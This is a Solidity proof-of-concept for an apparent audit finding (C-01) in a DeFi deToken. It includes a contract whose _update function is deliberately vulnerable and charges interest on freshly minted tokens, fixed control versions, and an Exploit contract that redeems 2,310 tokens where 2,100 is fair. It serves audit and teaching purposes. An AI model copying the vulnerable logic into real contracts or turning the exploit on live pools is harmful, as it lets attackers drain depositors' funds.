// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — DEToken._update (Pashov, 2025-06-26, C-01).
    _update runs on mint and adds `amount` to _userDeposits BEFORE it
    accrues interest, so interest is charged on the tokens just minted.
    A 1_000 deposit on a 10% stale index mints 210 extra interest.
    Fair redemption is 2_100 RToken. This run pays 2_310.
    The control skips mint/burn inside _update and pays 2_100. */

interface IStabilityPool {
    function getPoolIndex() external view returns (uint256);
}

contract RToken {
    string public symbol = "RToken";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public userIndex;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function getUserIndex(address user) external view returns (uint256) {
        return userIndex[user];
    }

    function setUserIndex(address user, uint256 index) external {
        userIndex[user] = index;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DEToken {
    string public symbol = "deToken";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    uint256 public _scaledTotalSupply;
    uint256 public interestMinted;
    address public stabilityPool;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public _userDeposits;
    mapping(address => uint256) public _userIndexes;

    function initialize(address pool) external {
        stabilityPool = pool;
    }

    function rawBalanceOf(address user) external view returns (uint256) {
        return balanceOf[user];
    }

    function getUserDeposit(address user) external view returns (uint256) {
        return _userDeposits[user];
    }

    function getUserIndex(address user) external view returns (uint256) {
        return _userIndexes[user];
    }

    function seed(address user, uint256 amount, uint256 index) external {
        _userDeposits[user] = amount;
        _userIndexes[user] = index;
        balanceOf[user] = amount;
        totalSupply = amount;
        _scaledTotalSupply = amount;
    }

    function mint(address account, uint256 value) external {
        _update(address(0), account, value);
    }

    function setUserDeposit(address user, uint256 amount) external {
        uint256 previousDeposit = _userDeposits[user];
        if (amount == 0) {
            delete _userDeposits[user];
            delete _userIndexes[user];
        } else {
            _userDeposits[user] = amount;
        }
        if (amount > previousDeposit) {
            _scaledTotalSupply += amount - previousDeposit;
        } else {
            _scaledTotalSupply -= previousDeposit - amount;
        }
    }

    function forceBurn(address user, uint256 amount) external {
        balanceOf[user] -= amount;
        totalSupply -= amount;
    }

    function _mint(address account, uint256 value) internal {
        _update(address(0), account, value);
    }

    function _update(address from, address to, uint256 amount) internal {
        if (from != address(0) && from != to) {
            _userDeposits[from] -= amount;
        }
        if (to != address(0) && to != from) {
            // @> VULN: the minted amount is added to the deposit before interest, so the new tokens earn a full period
            _userDeposits[to] += amount;
            if (_userIndexes[to] == 0) {
                _userIndexes[to] = IStabilityPool(stabilityPool).getPoolIndex();
            } else {
                uint256 currentIndex = IStabilityPool(stabilityPool).getPoolIndex();
                uint256 userIndex = _userIndexes[to];
                uint256 userIndexIncrease = currentIndex - userIndex;
                uint256 currentBalance = _userDeposits[to];
                uint256 rawAmountWithInterest = currentBalance + _rayMul(currentBalance, userIndexIncrease);
                uint256 rawInterestAmountToMint = rawAmountWithInterest - currentBalance;
                if (rawInterestAmountToMint > 0) {
                    _userIndexes[to] = currentIndex;
                    _scaledTotalSupply += rawInterestAmountToMint;
                    interestMinted += rawInterestAmountToMint;
                    _mint(to, rawInterestAmountToMint);
                }
            }
        }
        if (from == address(0)) {
            balanceOf[to] += amount;
            totalSupply += amount;
        } else if (to == address(0)) {
            balanceOf[from] -= amount;
            totalSupply -= amount;
        } else {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
    }

    function _rayMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b / 1e27;
    }
}

contract DETokenFixed {
    string public symbol = "deToken";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    uint256 public _scaledTotalSupply;
    uint256 public interestMinted;
    address public stabilityPool;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public _userDeposits;
    mapping(address => uint256) public _userIndexes;

    function initialize(address pool) external {
        stabilityPool = pool;
    }

    function getUserDeposit(address user) external view returns (uint256) {
        return _userDeposits[user];
    }

    function getUserIndex(address user) external view returns (uint256) {
        return _userIndexes[user];
    }

    function rawBalanceOf(address user) external view returns (uint256) {
        return balanceOf[user];
    }

    function seed(address user, uint256 amount, uint256 index) external {
        _userDeposits[user] = amount;
        _userIndexes[user] = index;
        balanceOf[user] = amount;
        totalSupply = amount;
        _scaledTotalSupply = amount;
    }

    function mint(address account, uint256 value) external {
        balanceOf[account] += value;
        totalSupply += value;
    }

    function setUserDeposit(address user, uint256 amount) external {
        uint256 previousDeposit = _userDeposits[user];
        _userDeposits[user] = amount;
        if (amount > previousDeposit) {
            _scaledTotalSupply += amount - previousDeposit;
        } else {
            _scaledTotalSupply -= previousDeposit - amount;
        }
    }

    function forceBurn(address user, uint256 amount) external {
        balanceOf[user] -= amount;
        totalSupply -= amount;
    }
}

contract StabilityPool is IStabilityPool {
    uint256 public constant RAY = 1e27;
    uint256 public poolIndex = 11 * RAY / 10;
    RToken public rToken;
    DEToken public deToken;

    constructor(RToken _rToken, DEToken _deToken) {
        rToken = _rToken;
        deToken = _deToken;
    }

    function getPoolIndex() external view returns (uint256) {
        return poolIndex;
    }

    function deposit(uint256 rawAmount) external {
        uint256 latestUserIndex = uint256(rToken.getUserIndex(msg.sender));
        uint256 previousDeposit = deToken.getUserDeposit(msg.sender);
        uint256 userIndexIncrease = poolIndex - latestUserIndex;
        uint256 scaledAmount;
        if (userIndexIncrease == 0) {
            scaledAmount = rawAmount;
        } else {
            scaledAmount = rawAmount + _rayMul(rawAmount, userIndexIncrease);
        }
        require(rToken.transferFrom(msg.sender, address(this), scaledAmount), "pull");
        uint256 previousUserIndex = deToken.getUserIndex(msg.sender);
        uint256 userPreviousIncrease = latestUserIndex - previousUserIndex;
        uint256 currentBalance = deToken.rawBalanceOf(msg.sender);
        uint256 rawAmountWithInterest = currentBalance + _rayMul(currentBalance, userPreviousIncrease);
        uint256 rawInterestAmountToMint = rawAmountWithInterest - currentBalance;
        uint256 newUserDepositAmount = previousDeposit + rawAmount + rawInterestAmountToMint;
        deToken.mint(msg.sender, rawAmount + rawInterestAmountToMint);
        deToken.setUserDeposit(msg.sender, newUserDepositAmount);
    }

    function redeem() external {
        uint256 claim = deToken.balanceOf(msg.sender);
        deToken.forceBurn(msg.sender, claim);
        require(rToken.transfer(msg.sender, claim), "pay");
    }

    function _rayMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b / 1e27;
    }
}

contract StabilityPoolFixed is IStabilityPool {
    uint256 public constant RAY = 1e27;
    uint256 public poolIndex = 11 * RAY / 10;
    RToken public rToken;
    DETokenFixed public deToken;

    constructor(RToken _rToken, DETokenFixed _deToken) {
        rToken = _rToken;
        deToken = _deToken;
    }

    function getPoolIndex() external view returns (uint256) {
        return poolIndex;
    }

    function deposit(uint256 rawAmount) external {
        uint256 latestUserIndex = uint256(rToken.getUserIndex(msg.sender));
        uint256 previousDeposit = deToken.getUserDeposit(msg.sender);
        uint256 userIndexIncrease = poolIndex - latestUserIndex;
        uint256 scaledAmount = userIndexIncrease == 0 ? rawAmount : rawAmount + _rayMul(rawAmount, userIndexIncrease);
        require(rToken.transferFrom(msg.sender, address(this), scaledAmount), "pull");
        uint256 previousUserIndex = deToken.getUserIndex(msg.sender);
        uint256 userPreviousIncrease = latestUserIndex - previousUserIndex;
        uint256 currentBalance = deToken.rawBalanceOf(msg.sender);
        uint256 interest = _rayMul(currentBalance, userPreviousIncrease);
        deToken.mint(msg.sender, rawAmount + interest);
        deToken.setUserDeposit(msg.sender, previousDeposit + rawAmount + interest);
    }

    function redeem() external {
        uint256 claim = deToken.balanceOf(msg.sender);
        deToken.forceBurn(msg.sender, claim);
        require(rToken.transfer(msg.sender, claim), "pay");
    }

    function _rayMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b / 1e27;
    }
}

contract Exploit {
    uint256 public constant RAY = 1e27;
    RToken public rToken;
    DEToken public deToken;
    StabilityPool public pool;
    uint256 public redeemed;
    uint256 public booked;

    constructor() {
        rToken = new RToken();
        deToken = new DEToken();
        pool = new StabilityPool(rToken, deToken);
        deToken.initialize(address(pool));
    }

    function run() external {
        rToken.setUserIndex(address(this), 11 * RAY / 10);
        rToken.mint(address(this), 1000 ether);
        rToken.mint(address(pool), 20000 ether);
        rToken.approve(address(pool), type(uint256).max);
        deToken.seed(address(this), 1000 ether, RAY);
        uint256 fairClaim = 2100 ether;
        pool.deposit(1000 ether);
        uint256 inflated = deToken.balanceOf(address(this));
        booked = deToken.getUserDeposit(address(this));
        uint256 mintedInterest = deToken.interestMinted();
        pool.redeem();
        redeemed = rToken.balanceOf(address(this));
        require(mintedInterest == 210 ether, "interest");
        require(inflated == 2310 ether, "tokens");
        require(booked == 2100 ether, "booked");
        require(redeemed == 2310 ether, "redeem");
        require(redeemed - fairClaim == 210 ether, "extra");
        require(rToken.balanceOf(address(pool)) == 20000 ether + 1000 ether - 2310 ether, "short");
    }
}
